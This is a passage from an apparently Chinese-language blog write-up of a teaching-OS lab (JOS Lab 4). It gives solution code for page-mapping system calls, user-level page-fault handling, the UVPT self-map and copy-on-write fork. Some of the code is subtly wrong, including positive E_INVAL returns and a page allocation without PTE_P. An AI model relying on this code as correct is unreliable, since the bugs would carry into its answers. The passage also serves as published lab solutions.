class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result=envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(status!=ENV_RUNNABLE&amp;&amp;status!=ENV_NOT_RUNNABLE)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_status = status;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page of memory and map it at 'va' with permission</span></span><br><span class="line"><span class="comment">// 'perm' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// The page's contents are set to 0.</span></span><br><span class="line"><span class="comment">// If a page is already mapped at 'va', that page is unmapped as a</span></span><br><span class="line"><span class="comment">// side effect.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// perm -- PTE_U | PTE_P must be set, PTE_AVAIL | PTE_W may or may not be set,</span></span><br><span class="line"><span class="comment">//         but no other bits may be set.  See PTE_SYSCALL in inc/mmu.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see above).</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate the new page,</span></span><br><span class="line"><span class="comment">//or to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_alloc(ALLOC_ZERO)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,page,va,perm);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map the page of memory at 'srcva' in srcenvid's address space</span></span><br><span class="line"><span class="comment">// at 'dstva' in dstenvid's address space with permission 'perm'.</span></span><br><span class="line"><span class="comment">// Perm has the same restrictions as in sys_page_alloc, except</span></span><br><span class="line"><span class="comment">// that it also must not grant write access to a read-only</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if srcenvid and/or dstenvid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change one of them.</span></span><br><span class="line"><span class="comment">//-E_INVAL if srcva &gt;= UTOP or srcva is not page-aligned,</span></span><br><span class="line"><span class="comment">//or dstva &gt;= UTOP or dstva is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL is srcva is not mapped in srcenvid's address space.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see sys_page_alloc).</span></span><br><span class="line"><span class="comment">//-E_INVAL if (perm &amp; PTE_W), but srcva is read-only in srcenvid's</span></span><br><span class="line"><span class="comment">//address space.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> srcenvid, <span class="type">void</span> *srcva,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dstenvid, <span class="type">void</span> *dstva, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">srcenv</span>,*<span class="title">dstenv</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">pte_t</span>* srcpte,*dstpte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">srcpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(srcva&gt;=(<span class="type">void</span>*)UTOP||srcva!=ROUNDDOWN(srcva,PGSIZE)||dstva&gt;=(<span class="type">void</span>*)UTOP||dstva!=ROUNDDOWN(dstva,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(srcenvid,&amp;srcenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(dstenvid,&amp;dstenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(srcpage = page_lookup(srcenv-&gt;env_pgdir,srcva,&amp;srcpte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(((*srcpte)&amp;PTE_W)==<span class="number">0</span>&amp;&amp;((perm&amp;PTE_W)!=<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((result = page_insert(dstenv-&gt;env_pgdir,srcpage,dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmap the page of memory at 'va' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// If no page is mapped, the function silently succeeds.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">page_remove(e-&gt;env_pgdir,va);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Copy-on-Write-Fork"><a href="#Part-B-Copy-on-Write-Fork" class="headerlink" title="Part B: Copy-on-Write Fork"></a>Part B: Copy-on-Write Fork</h3><h4 id="User-level-page-fault-handling"><a href="#User-level-page-fault-handling" class="headerlink" title="User-level page fault handling"></a>User-level page fault handling</h4><h5 id="Setting-the-Page-Fault-Handler"><a href="#Setting-the-Page-Fault-Handler" class="headerlink" title="Setting the Page Fault Handler"></a>Setting the Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the page fault upcall for 'envid' by modifying the corresponding struct</span></span><br><span class="line"><span class="comment">// Env's 'env_pgfault_upcall' field.  When 'envid' causes a page fault, the</span></span><br><span class="line"><span class="comment">// kernel will push a fault record onto the exception stack, then branch to</span></span><br><span class="line"><span class="comment">// 'func'.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_pgfault_upcall</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *func)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_pgfault_upcall = func;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Invoking-the-User-Page-Fault-Handler"><a href="#Invoking-the-User-Page-Fault-Handler" class="headerlink" title="Invoking the User Page Fault Handler"></a>Invoking the User Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_fault_handler</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> fault_va;</span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs&amp;<span class="number">3</span>)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"kernel pagefalut\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_pgfault_upcall==<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> recursive = (tf-&gt;tf_esp &gt;= UXSTACKTOP - PGSIZE) &amp;&amp; (tf-&gt;tf_esp &lt; UXSTACKTOP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span>* <span class="title">utf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(recursive)</span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(tf-&gt;tf_esp-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe)-<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"><span class="comment">// cprintf("recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,tf-&gt;tf_esp-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(UXSTACKTOP-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe));</span><br><span class="line"><span class="comment">// cprintf("non-recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,UXSTACKTOP-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">utf-&gt;utf_esp = tf-&gt;tf_esp; </span><br><span class="line">utf-&gt;utf_eflags = tf-&gt;tf_eflags;</span><br><span class="line">utf-&gt;utf_regs = tf-&gt;tf_regs;</span><br><span class="line">utf-&gt;utf_err = tf-&gt;tf_err;</span><br><span class="line">utf-&gt;utf_eip = tf-&gt;tf_eip;</span><br><span class="line">utf-&gt;utf_fault_va = fault_va;</span><br><span class="line"></span><br><span class="line">tf-&gt;tf_esp = (<span class="type">uintptr_t</span>)utf;</span><br><span class="line">tf-&gt;tf_eip = (<span class="type">uint32_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">env_run(curenv);</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">"[%08x] user fault va %08x ip %08x\n"</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="User-mode-Page-Fault-Entrypoint"><a href="#User-mode-Page-Fault-Entrypoint" class="headerlink" title="User-mode Page Fault Entrypoint"></a>User-mode Page Fault Entrypoint</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl _pgfault_upcall</span><br><span class="line">_pgfault_upcall:</span><br><span class="line">// Call the C page fault handler.</span><br><span class="line">pushl %esp// function argument: pointer to UTF</span><br><span class="line">movl _pgfault_handler, %eax</span><br><span class="line">call *%eax</span><br><span class="line">addl $4, %esp// pop function argument</span><br><span class="line"></span><br><span class="line">movl 40(%esp),%ebx //取出trap_eip</span><br><span class="line">subl $4,48(%esp) //抬高栈4字节,此空间为trap_eip的返回地址</span><br><span class="line">movl 48(%esp),%eax //取出trap_esp</span><br><span class="line">movl %ebx,(%eax) </span><br><span class="line"></span><br><span class="line">addl $8,%esp //跳过err和fault_va</span><br><span class="line"></span><br><span class="line">popal //restore the trap-time registers</span><br><span class="line"></span><br><span class="line">addl $4,%esp //跳过trap_eip</span><br><span class="line">popf</span><br><span class="line"></span><br><span class="line">     popl %esp</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">set_pgfault_handler</span><span class="params">(<span class="type">void</span> (*handler)(<span class="keyword">struct</span> UTrapframe *utf))</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) {</span><br><span class="line"><span class="comment">// First time through!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> eid = sys_getenvid();</span><br><span class="line"><span class="keyword">if</span>(sys_page_alloc(eid,(<span class="type">void</span>*)(UXSTACKTOP-PGSIZE),PTE_W|PTE_U|PTE_P))</span><br><span class="line">{</span><br><span class="line"><span class="comment">//panic("fail\n"); User系统调用失败,凭啥让内核panic?</span></span><br><span class="line">}</span><br><span class="line">sys_env_set_pgfault_upcall(eid,_pgfault_upcall);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save handler pointer for assembly to call.</span></span><br><span class="line">_pgfault_handler = handler;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="Implementing-Copy-on-Write-Fork"><a href="#Implementing-Copy-on-Write-Fork" class="headerlink" title="Implementing Copy-on-Write Fork"></a>Implementing Copy-on-Write Fork</h4><h5 id="页表-页目录表的映射分析"><a href="#页表-页目录表的映射分析" class="headerlink" title="页表,页目录表的映射分析"></a>页表,页目录表的映射分析</h5><p>实现完用户级页面错误处理例程的安装工作后,下面进入Fork函数的实现.<br>在此之前,先来理解一个<code>clever mapping trick</code>.</p><p>在为环境建立映射的时候,有这样一个操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br></pre></td></tr></tbody></table></figure><p>UVPT的定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User read-only virtual page table (see 'uvpt' below)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UVPT(ULIM - PTSIZE)</span></span><br></pre></td></tr></tbody></table></figure><p>根据注释,我们可以理解这一操作是将页目录表自身映射到虚拟地址UVPT,使用户进程可以只读访问.But how does it work?</p><p>先来看这样一个情形.用户态lib的某个函数要检查一个物理页在其页表中的pte条目来判断操作是否合法.自然而然的想法是:通过之前映射的页目录表找到对应的页目录表目中的页表地址,再访问该页表的对应pte条目.</p><p>但问题是,页目录表条目pde中存的是页表的物理地址而不是虚拟地址,没办法访问到对应页表.你可能会想,不对啊,之前在内核态的时候有过访问pte的操作啊.其实是因为之前访问时是先将从页目录表中取出的页表物理地址转换成KVA虚拟地址后再访问的,能完成这样的操作是因为我们曾经将从0开始的物理地址空间映射到了KERNBASE之上.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></tbody></table></figure><p>而用户进程并不具有访问KERNBASE之上虚拟地址空间的能力.</p><p>那用户进程应该怎么访问页表条目呢?页表本身也是一个物理页,而访问一个物理页就需要找到该物理页对应的页表,页表的页表,也就是页目录表.把页目录表当作一个页表,不久能找到页表本身的物理地址了?</p><p>回想一下分页机制的工作.先在页目录表中通过PDX找到页表,再在页表中通过PTX找到物理页.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111628497.png"><br>那如果我们让页目录表根据PDX找到页目录表自身,页部件就会把页目录表当成页表,再根据PTX找到页表本身的物理地址并进行访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111631565.png"></p><p>理解完这一过程,再来看看如何找到想访问的页表或页表项的地址.<br>对于32位地址addr –&gt; PDX|PTX|OFFSET.</p><p>PDX是页目录表的索引,要让它索引到自身,便固定了得是(UPVT&gt;&gt;22)<br>由于我们将页目录表当作是页表,则PTX同样也用来在页目录表上索引,查找到的物理地址意义为第PTX个页表的物理地址.<br>OFFSET便用于在页表上偏移,页表的内容是页表条目,每个大小4字节,所以OFFSET便是该页表的第OFFSET/4项.</p><p>综合起来,upvt[n]就相当于访问了物理空间第n页的页表条目.<br>upvt[addr&gt;&gt;12]访问的就是addr所在物理页的页表条目.<br>upvd[addr&gt;&gt;22]访问的就是addr对应的页表在页目录表中的条目.<br>这也解释了entry.S中的宏定义.<br>其实挺反直觉的,页目录表映射到UVPT,但访问UVPT却访问到的是第0页的页表.而页目录表要用uvpd去访问(UVPT+(UVPT&gt;&gt;12)*4).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.globl uvpt</span><br><span class="line">.<span class="built_in">set</span> uvpt, UVPT</span><br><span class="line">.globl uvpd</span><br><span class="line">.<span class="built_in">set</span> uvpd, (UVPT+(UVPT&gt;&gt;<span class="number">12</span>)*<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="Fork代码实现"><a href="#Fork代码实现" class="headerlink" title="Fork代码实现"></a>Fork代码实现</h5><p>pgfault是Custom page fault handler,如果发生页面错误的是对COW页面的写入操作,分配一个物理页拷贝原数据并设定可写</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Custom page fault handler - if faulting page is copy-on-write,</span></span><br><span class="line"><span class="comment">// map in our own private writable copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> err = utf-&gt;utf_err;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((err&amp;FEC_WR)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not a write\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[PGNUM(addr)];</span><br><span class="line"><span class="keyword">if</span>((pte&amp;PTE_COW)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not to a copy-on-write page\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,PFTEMP,PTE_W|PTE_U)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_alloc error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)PFTEMP,ROUNDDOWN(addr,PGSIZE),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(sys_page_map(<span class="number">0</span>,PFTEMP,<span class="number">0</span>,ROUNDDOWN(addr,PGSIZE),PTE_W|(pte&amp;PTE_SYSCALL&amp;~PTE_COW)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_map error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, (<span class="type">void</span> *)PFTEMP)) &lt; <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">"pgfault: sys_page_unmap() failed: %e\n"</span>, r);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>duppage映射页面pn到envid(子)进程,若为可写页面或COW则将自身(父进程)和envid进程中该页均映射为COW(因为父进程可能也是fork出来的且并没有得到独立的页面,仅是COW).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">duppage</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">unsigned</span> pn)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> addr = pn*PGSIZE;</span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[pn];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pte&amp;(PTE_W|PTE_COW))</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="comment">//为子进程映射页面并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//清除父进程的PTE_W并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,<span class="number">0</span>,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_U|(pte&amp;PTE_SYSCALL)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span 